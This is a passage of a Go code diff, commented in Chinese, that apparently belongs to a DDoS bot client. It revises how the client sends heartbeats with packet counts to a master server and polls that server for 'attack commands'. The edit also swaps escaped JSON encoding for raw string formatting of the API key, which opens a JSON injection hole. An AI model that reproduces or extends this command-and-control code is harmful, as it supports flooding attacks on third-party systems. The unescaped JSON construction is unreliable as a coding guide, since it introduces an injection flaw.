@@ -56,17 +56,12 @@ func sendHeartbeat() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		// 构建心跳数据 - 使用 []byte 和 json.RawMessage 避免特殊字符被转义
-		jsonStr := fmt.Sprintf(`{
-			"serverId": %d,
-			"apiKey": %s,
-			"packetsSent": %d,
-			"packetsRate": %d
-		}`, 
-		config.ServerID,
-		json.RawMessage(fmt.Sprintf("%q", config.APIKey)),
-		atomic.LoadUint64(&packetsSent),
-		atomic.LoadUint64(&packetsRate))
+		// 直接构建JSON字符串，避免任何形式的自动转义
+		jsonStr := fmt.Sprintf(`{"serverId":%d,"apiKey":"%s","packetsSent":%d,"packetsRate":%d}`, 
+			config.ServerID, 
+			config.APIKey,  // 直接使用原始API密钥
+			atomic.LoadUint64(&packetsSent),
+			atomic.LoadUint64(&packetsRate))
 
 		// 添加当前任务信息（如果有）
 		taskMutex.RLock()
@@ -78,15 +73,15 @@ func sendHeartbeat() {
 		taskMutex.RUnlock()
 
 		if hasTask {
-			// 简单字符串替换，插入任务ID
-			jsonStr = strings.Replace(jsonStr, "}", fmt.Sprintf(`, "activeTaskId": %d}`, taskID), 1)
+			// 插入任务ID到JSON末尾
+			jsonStr = jsonStr[:len(jsonStr)-1] + fmt.Sprintf(`,"activeTaskId":%d}`, taskID)
 		}
 
 		// 构建心跳URL
 		heartbeatURL := fmt.Sprintf("%s/api/heartbeat", config.MasterURL)
 
 		// 发送心跳请求
-		log.Printf("发送心跳: %s (发送数据: %s)", heartbeatURL, jsonStr)
+		log.Printf("发送心跳: %s", heartbeatURL)
 		
 		req, err := http.NewRequest("POST", heartbeatURL, strings.NewReader(jsonStr))
 		if err != nil {
@@ -119,19 +114,16 @@ func sendHeartbeat() {
 // 监听攻击命令
 func listenForCommands() {
 	for {
-		// 构建命令URL和请求体 - 使用原始字符串避免特殊字符被转义
+		// 构建命令URL和请求体
 		commandURL := fmt.Sprintf("%s/api/commands", config.MasterURL)
 		
-		// 使用原始JSON字符串
-		jsonStr := fmt.Sprintf(`{
-			"serverId": %d,
-			"apiKey": %s
-		}`, 
-		config.ServerID,
-		json.RawMessage(fmt.Sprintf("%q", config.APIKey)))
+		// 直接构建JSON字符串，避免任何形式的自动转义
+		jsonStr := fmt.Sprintf(`{"serverId":%d,"apiKey":"%s"}`,
+			config.ServerID,
+			config.APIKey)  // 直接使用原始API密钥
 		
 		// 发送命令请求
-		log.Printf("获取命令: %s (发送数据: %s)", commandURL, jsonStr)
+		log.Printf("获取命令: %s", commandURL)
 		req, err := http.NewRequest("POST", commandURL, strings.NewReader(jsonStr))
 		if err != nil {
 			log.Printf("创建请求失败: %v", err)
